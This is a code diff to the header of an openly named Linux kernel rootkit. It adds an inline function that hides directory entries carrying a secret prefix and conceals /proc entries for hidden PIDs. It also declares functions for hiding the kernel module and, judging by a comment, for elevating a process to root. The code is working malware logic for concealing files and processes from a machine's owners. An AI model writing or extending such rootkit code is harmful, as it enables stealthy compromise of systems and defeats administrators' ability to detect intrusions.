@@ -1,8 +1,11 @@
 #ifndef _ROOTKIT_UTILS_H_
 #define _ROOTKIT_UTILS_H_
 
+#include "constants.h"
+#include "files.h"
+#include "macro_utils.h"
 #include <asm/current.h>
-#include <linux/sched.h> // For `struct task_struct`
+#include <linux/kstrtox.h>
 #include <linux/types.h>
 #include <vdso/limits.h>
 
@@ -104,13 +107,47 @@ void hide_module(void);
 void show_all_processes(void);
 
 /**
- * Checks if the given PID is hidden.
+ * Checks if the given PID is in the list of hidden PIDs.
  * If the given PID is 0, the current process is checked.
  *
  * @param i32_pid The PID to check
- * @return `true` if the given PID is hidden, `false` otherwise
+ * @return `true` if the given PID is in the list of hidden PIDs, `false` otherwise
  */
-bool is_process_hidden(const pid_t i32_pid);
+bool is_pid_hidden(const pid_t i32_pid);
+
+/**
+ * Does the given dirent structure need to be hidden?
+ *
+ * @param p_dirent The dirent structure
+ * @param b_is_proc_child Is the dirent a child of /proc/?
+ * @return `true` if the given dirent structure needs to be hidden, `false` otherwise
+ */
+static inline bool is_dirent_hidden(const dirent64_t *const p_dirent, const bool b_is_proc_child)
+{
+    // Check the name starts with the hidden prefix
+    IF_U (!strncmp(p_dirent->d_name, S_HIDDEN_PREFIX, HIDDEN_PREFIX_LEN)) {
+        return true;
+    }
+
+    // If the dirent is a child of /proc/, first check if its name is a number
+    // If it is, check if the corresponding PID is hidden
+    IF_U (b_is_proc_child) {
+        pid_t i32_pid = 0; // PID of the dirent
+
+        // Convert the name to a number
+        IF_U (kstrtoint(p_dirent->d_name, 10, &i32_pid)) {
+            // If the name is not a number, this is not a PID, so we can return false
+            return false;
+        }
+
+        // Check if the PID is hidden
+        IF_U (is_pid_hidden(i32_pid)) {
+            return true;
+        }
+    }
+
+    return false;
+}
 
 /**
  * Elevates the current process to root
